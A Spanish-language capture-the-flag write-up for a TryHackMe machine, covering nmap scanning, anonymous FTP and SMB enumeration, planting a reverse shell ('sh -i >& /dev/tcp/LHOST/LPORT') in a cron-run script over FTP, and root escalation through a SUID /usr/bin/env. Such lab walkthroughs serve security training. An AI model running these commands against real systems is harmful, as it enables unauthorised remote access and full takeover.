mkdirBienvenidos a otra sala de tryhackme. En esta ocasion tendremos otra maquina en dificultad medio. Escaneamos puertos abiertos con nuestra herramienta bien conocida, enumeramos los servicios ftp y smb para obtener posible informacion. Luego, nos abusaremos de un script .sh para obtener una reverse shell en nuestro sistema y escalaremos privilegios elevados a usuario raiz root con `/env`


# Recon

Iniciamos nuestro reconocimiento utilizando __nmap__. Le diremos que escanee todos los puertos abiertos, con una tasa de paquetes de 5000, en modo sigiloso sin activar las alertas de seguridad y haciendo el escaneo mas rapido, tambien le diremos que no compruebe si el objetivo este en linea, que no resuelva los nombres del host durante el escaneo evitando que los servidores __DNS__ registren el escaneo y haciendo el escaneo mucho mas rapido, tambien que nos muestre la version del servicio, y lo resuelva todo en modo agresivo "__T4__", usamos verbose para ver el progreso del escaneo y que guarde todo el proceso en formato normal, para luego poder echarle un vistazo siempre que querramos. Ejecutaremos nuestro comando : `sudo nmap  -p- --open --min-rate 5000 -sS -Pn -n -sV -T4 -vvv IPTARGET -oN nmap`

```ruby
Nmap scan report for IPTARGET
Host is up, received user-set (0.22s latency).
Scanned at 2023-07-06 08:46:09 EDT for 31s
Not shown: 64423 closed ports, 1108 filtered ports
Reason: 64423 resets and 1108 no-responses
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap

```

Nuestro escaneo de nmap nos muestra 4 puertos abiertos. Enumere el servidio **smb**, encontre unas imagenes de cachorros del cual utilice `exiftool` para observas mas a detalle las imagenes, hubo una que tuvo una buena informacion, mas de lo esperado pero no encontre nada relevante, solo un dominio que cuando lo agregue a `/etc/hosts` no me funciono y decidi dejarlo ahi.

Iniciaremos el proceso de enumeracion en el puerto 21(ftp) para ver posibles notas o cualquier informacion util.  Recordemos que debemos utilizar Anonymous como usuario, no requiere password.

```bash
ftp IPTARGET

ftp> pwd
Remote directory: /scripts
ftp> ls
229 Entering Extended Passive Mode (|||45431|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          989 Jul 06 12:48 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

Obtenemos todos los archivos y observamos que contienen. Solamente un log que no nos dice mucho y una nota que deberia cambiar la seguridad de logeo Anonymous. Tenemos un script que basicamente lo que hace es lanzar un mensaje y lo sobreescriba al archivo log que observamos anteriormente. Esto funciona como una tarea programada, por lo que podemos realizar una shell en nuestro sistema.

# Intrusion

Lo que haremos a continuacion, sera crear una shell en nuestra maquina atacante, le daremos permisos de ejecucion y lo pondremos en el servicios ftp para generar una shell interactiva de su sistema en el nuestro, de la siguiente manera:

```bash
# En nuestra maquina atacante
echo "sh -i >& /dev/tcp/LHOST/LPORT 0>&1" >> clean.sh

# En el servicio ftp
put clean.sh

# Corroboramos que se modifico correctamente 
more clean.sh

# Nos ponemos en escucha en nuestra maquina atacante
nc -nvlp LPORT
```

Esperamos unos segundos y tenemos nuestra respuesta exitosamente.

# Priv.Escalation

Upgradeamos nuestra shell :

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Buscamos permisos elevados dentro del sistema : 

```bash
find / -type f -perm -4000 -ls 2>/dev/null
```

Podemos escalar privilegios con los permisos en /usr/bin/env de la siguiente manera:

```bash
/usr/bin/env /bin/sh -p
```

Informacion obtenida de https://gtfobins.github.io/gtfobins/env/